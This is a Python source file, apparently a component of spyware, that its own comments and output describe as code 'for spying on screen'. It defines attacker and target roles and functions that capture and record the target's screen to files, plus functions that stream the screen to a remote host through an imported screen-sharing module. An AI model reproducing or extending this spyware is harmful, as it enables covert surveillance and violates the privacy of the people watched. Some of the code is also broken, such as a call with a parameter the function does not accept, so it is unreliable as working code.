#I want to create a script that would allow for spying on screen

#Useful libraries that I would be working with -->
import os
import cv2 as cv
import numpy as np
import pyautogui
import screen_sharer as ss

#This class would handle every screen related intel gathering functions
class ScreenIntel:
    def __init__(self, attacker = None, target = None):
        self.fps = 25
        self.samplerate = 44100  # Hertz
        self.count = 1
        self.attacker = attacker
        self.target = target

    #This function handles the screen shotting of the screen
    def screenShotter(self):
        try:
            image = pyautogui.screenshot() #This does the screenshot
            image = np.array(image)
            image = cv.cvtColor(image, cv.COLOR_BGR2RGB)
            #print(image)
            path = f'{os.getcwd()}\\{self.target}_Screenshot.jpg'
            cv.imwrite(path, image)
            stat = "Successfully screenshotted the screen"
        except Exception as e:
            stat = f"An error occurred when attempting a screen shot due to [{e}]"
        return image, stat

    #This function handles the recording of the screen
    def screenVideo(self, secs):
        imgList = []
        while True:
            image, _ = self.screenShotter(send = False)
            imgList.append(image) #This appends the various images to the list
            time_ = self.fps * secs
            if len(imgList) == time_:
                count = 0
                imageArray = []

                #Looping through the images in the image list
                for img in imgList:
                    height, width, layers = img.shape
                    size = (width, height)
                    imageArray.append(img)
                path_ = os.getcwd()
                videoFile = f'{self.target}_ScreenRecord.mp4'
                path = f"{path_}\\{videoFile}"
                out = cv.VideoWriter(videoFile, cv.VideoWriter_fourcc(*'mp4v'), self.fps, size) 
                #print(f"Out: {out}")
 
                for i in range(len(imageArray)):
                    out.write(imageArray[i])
                out.release()
                del imgList
                imgList = []
                print(f"{videoFile} --> successfully written!!")

                #os.remove(path)
                break

                cv.waitKey(100)

            cv.destroyAllWindows()
        return videoFile

    #This function handles the viewing of target screen
    def screenSender(self, host):
        try:
            stat = ss.ScreenSharer().sender(host)
        except Exception as e:
            stat = f"An error occurred in screen sender function due to [{e}]"
            raise KeyboardInterrupt
        return stat

    #This function handles the receiving of target screen
    def screenReceiver(self, host):
        try:
            stat = ss.ScreenSharer().receiver(host)
        except Exception as e:
            stat = f"An error occurred in screen receiver function due to [{e}]"
            raise KeyboardInterrupt
        return stat


if __name__ == "__main__":
    print("Screen spyware")
    
